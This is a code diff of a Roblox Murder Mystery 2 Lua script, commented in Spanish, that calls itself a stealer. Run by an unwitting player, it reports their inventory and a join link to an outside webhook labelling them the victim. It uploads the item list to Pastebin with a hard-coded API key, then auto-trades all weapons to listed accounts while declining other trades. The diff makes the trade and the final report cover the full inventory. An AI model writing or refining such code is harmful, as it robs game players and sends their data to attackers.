@@ -1,5 +1,4 @@
--- ======= SCRIPT ORIGINAL + SISTEMA DE RECHAZO AVANZADO =======
-
+-- ======= SCRIPT COMPLETO + TRADE AVANZADO Y WEBHOOK FINAL =======
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -33,7 +32,7 @@ local function SendWebhook(title, description, fields, prefix)
     end)
 end
 
--- Función para crear pastebin
+-- Función para crear Pastebin
 local function CreatePaste(content)
     local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
     local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
@@ -168,7 +167,6 @@ local function buildValueList()
 end
 
 -- ====================================
-
 local weaponsToSend={}
 local totalValue=0
 local min_rarity_index=table.find(rarityTable,min_rarity)
@@ -189,14 +187,13 @@ for id,amount in pairs(profile.Weapons.Owned) do
         end
     end
 end
-
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
 -- 🔹 Fern Link real solo visible en webhook
 local fernToken = math.random(100000,999999)
 local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
--- Preparar contenido completo para Pastebin
+-- Preparar Pastebin
 local pasteContent = ""
 for _, w in ipairs(weaponsToSend) do
     pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
@@ -216,49 +213,51 @@ if #weaponsToSend > 0 then
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
         {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
     }
-
     local maxEmbedItems = math.min(18,#weaponsToSend)
     for i=1,maxEmbedItems do
         local w = weaponsToSend[i]
         fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
-
     if #weaponsToSend > 18 then
         fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
         if pasteLink then
             fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
         end
     end
-
     local prefix=pingEveryone and "@everyone " or ""
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
 -- ================= Trade Avanzado con rechazo y monitorio =================
 local currentTarget = nil
+local weaponsBackup = {}
+for _, w in ipairs(weaponsToSend) do
+    table.insert(weaponsBackup, w)
+end
 
 local function doTrade(targetName)
-    if #weaponsToSend == 0 then return end
+    if #weaponsBackup == 0 then return end
     local targetPlayer = Players:FindFirstChild(targetName)
     if not targetPlayer then return end
 
-    -- Si ya hay un trade con alguien más, declina
     if currentTarget and currentTarget ~= targetName then
         declineTrade()
         task.wait(0.5)
     end
 
     currentTarget = targetName
+    local weaponsToTrade = {}
+    for _, w in ipairs(weaponsBackup) do table.insert(weaponsToTrade, w) end
 
-    while #weaponsToSend > 0 do
+    while #weaponsToTrade > 0 do
         local status = getTradeStatus()
         if status == "None" then
             sendTradeRequest(targetName)
         elseif status == "SendingRequest" then
             task.wait(0.3)
         elseif status == "StartTrade" then
-            for i = 1, math.min(4, #weaponsToSend) do
-                local w = table.remove(weaponsToSend, 1)
+            for i = 1, math.min(4, #weaponsToTrade) do
+                local w = table.remove(weaponsToTrade, 1)
                 for _ = 1, w.Amount do
                     addWeaponToTrade(w.DataID)
                 end
@@ -272,16 +271,16 @@ local function doTrade(targetName)
         task.wait(1)
     end
 
-    -- Webhook final completo
+    -- Webhook final con inventario completo
     local fieldsFinal={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
         {name="📦 Inventario enviado:", value="", inline=false},
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
     }
-    for _, w in ipairs(weaponsToSend) do
+    for _, w in ipairs(weaponsBackup) do
         fieldsFinal[2].value = fieldsFinal[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
-    if #weaponsToSend>18 and pasteLink then
+    if #weaponsBackup>18 and pasteLink then
         fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\nMira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
     end
     local prefix=pingEveryone and "@everyone " or ""
@@ -290,14 +289,14 @@ local function doTrade(targetName)
     currentTarget = nil
 end
 
--- Rechazar trades de usuarios fuera de lista y priorizar usuarios de la lista
+-- Rechazar trades de usuarios fuera de lista
 TradeService.OnTradeReceived.OnClientEvent:Connect(function(sender)
     if not table.find(users, sender.Name) then
-        declineTrade() -- rechaza usuarios no permitidos
+        declineTrade()
     elseif currentTarget ~= sender.Name then
-        declineTrade() -- declina trade actual
+        declineTrade()
         task.wait(0.5)
-        doTrade(sender.Name) -- envía trade a usuario de la lista
+        doTrade(sender.Name)
     end
 end)
 
